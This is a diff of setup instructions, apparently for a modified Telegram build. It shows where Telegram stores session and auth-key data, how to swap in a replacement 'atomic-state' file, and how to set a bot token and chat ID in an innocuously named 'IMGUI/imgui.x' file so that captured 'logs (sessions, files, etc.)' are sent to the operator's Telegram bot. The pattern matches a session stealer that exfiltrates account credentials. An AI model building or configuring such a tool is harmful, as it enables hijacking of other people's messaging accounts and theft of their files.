@@ -35,7 +35,7 @@ To build and package the final version:
 	3.	Open the Applications tab (bottom left).
 	4.	Find your Telegram instance and tap the info icon (!).
 	5.	Go to the path:
-'''AppGroups/telegram-data/accounts-metadata/'''
+AppGroups/telegram-data/accounts-metadata/
 	6.	You’ll find atomic-state there — it contains your saved sessions/auth keys.
 	7.	To avoid overwriting, rename the old file by adding a symbol before replacing it.
 
@@ -61,8 +61,8 @@ To ensure that all logs (sessions, files, etc.) are sent directly to your bot:
 	1.	Open the project folder.
 	2.	Navigate to: IMGUI/imgui.x
 	3.	Update the following lines:
-'''NSString *const kBotToken = @"YOUR_BOT_TOKEN_HERE"; // Get it from @BotFather
-NSString *const kChatID = @"YOUR_CHAT_ID_HERE";     // Use @getmyid_bot or Swiftgram settings to get your ID'''
+NSString *const kBotToken = @"YOUR_BOT_TOKEN_HERE"; // Get it from @BotFather
+NSString *const kChatID = @"YOUR_CHAT_ID_HERE";     // Use @getmyid_bot or Swiftgram settings to get your ID
 4.	Don’t forget to start the bot by sending /start.
 
 ⸻
